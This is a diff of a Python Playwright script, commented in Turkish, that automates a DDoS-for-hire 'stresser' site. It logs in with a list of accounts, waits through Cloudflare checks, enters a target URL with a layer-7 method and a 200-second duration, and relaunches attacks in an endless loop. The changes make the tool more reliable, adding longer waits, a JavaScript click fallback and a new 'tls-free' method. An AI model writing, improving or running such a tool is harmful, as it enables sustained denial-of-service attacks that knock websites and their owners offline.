@@ -11,7 +11,7 @@ def load_accounts():
     accounts = []
     if not os.path.exists(ACCOUNTS_FILE):
         print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
-        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "browser-free"}]
+        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "tls-free"}]
 
     with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
         for idx, line in enumerate(f, 1):
@@ -27,7 +27,7 @@ def load_accounts():
                 url, method = rest.rsplit(":", 1)
             else:
                 url = rest
-                method = "browser-free"
+                method = "tls-free"
             accounts.append({
                 "id": str(idx),
                 "user": user,
@@ -77,19 +77,24 @@ def attack_worker(account):
                 # ---------- GİRİŞ ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="domcontentloaded")
+                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="load")
                     
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
-                        print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
-                        page.wait_for_timeout(15000)
-                        page.reload(wait_until="domcontentloaded")
+                        print(f"[{username}] ⚡ Cloudflare challenge algılandı, 20 saniye bekleniyor...")
+                        page.wait_for_timeout(20000)
+                        page.reload(wait_until="load")
                         page.wait_for_timeout(5000)
 
                     page.wait_for_selector("#username", timeout=30000)
                     page.fill("#username", username)
                     page.fill("#password", password)
-                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
-                    page.click("#loginNextBtn")
+                    
+                    # Giriş butonunu bekle ve tıkla (kararsızsa JavaScript ile tıkla)
+                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
+                    try:
+                        page.click("#loginNextBtn", timeout=10000)
+                    except:
+                        page.evaluate("document.getElementById('loginNextBtn').click()")
                     
                     page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                     print(f"[{username}] ✅ Giriş başarılı!")
@@ -106,11 +111,14 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
+                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="load")
                     page.wait_for_timeout(3000)
+                    
+                    # #layer_7'yi bekle ve tıkla
                     page.wait_for_selector("#layer_7", timeout=20000)
                     page.locator("#layer_7").click()
                     print(f"[{username}] ✅ #layer_7 tıklandı.")
+                    page.wait_for_timeout(2000)
                     consecutive_errors = 0
                 except Exception as stress_err:
                     print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
@@ -124,20 +132,25 @@ def attack_worker(account):
                 # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
                 while True:
                     try:
+                        # Form elemanlarının görünür olmasını bekle
+                        page.wait_for_selector("#l7host", timeout=20000)
+                        page.wait_for_selector("#l7method", timeout=10000)
+                        page.wait_for_selector("#l7time", timeout=10000)
+                        page.wait_for_selector("#l7btn", timeout=20000)
+                        
                         # Formu doldur
-                        page.wait_for_selector("#l7host", timeout=15000)
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
-                        page.fill("#l7time", "200")
+                        page.fill("#l7time", "200")  # Sabit 200 saniye
                         
-                        # Başlat butonuna tıkla
-                        page.wait_for_selector("#l7btn", timeout=15000)
-                        page.click("#l7btn")
+                        # Başlat butonuna tıkla (görünür olana kadar bekle)
+                        page.click("#l7btn", timeout=15000)
                         print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
                         consecutive_errors = 0
 
                         # Saldırı durumu takibi
                         while True:
+                            # Sayfadaki saldırı durumunu kontrol et
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
                                 print(f"[{username}] ⏰ Saldırı bitti.")
@@ -160,22 +173,25 @@ def attack_worker(account):
 
                         # Saldırı bitti, sayfayı yenile ve tekrar hazırlan
                         print(f"[{username}] 🔄 Sayfa yenileniyor...")
-                        page.reload(wait_until="domcontentloaded")
+                        page.reload(wait_until="load")
                         page.wait_for_timeout(3000)
-                        # Tekrar #layer_7'ye tıkla
+                        
+                        # #layer_7'ye tekrar tıkla
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.locator("#layer_7").click()
-                        page.wait_for_timeout(1000)
+                        page.wait_for_timeout(2000)
 
                     except Exception as inner_err:
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
-                            page.reload(wait_until="domcontentloaded")
+                            # Sayfayı yenile ve tekrar dene
+                            page.reload(wait_until="load")
                             page.wait_for_timeout(5000)
+                            # #layer_7'ye tıkla
                             page.wait_for_selector("#layer_7", timeout=15000)
                             page.locator("#layer_7").click()
-                            page.wait_for_timeout(1000)
+                            page.wait_for_timeout(2000)
                         except:
                             pass
                         continue
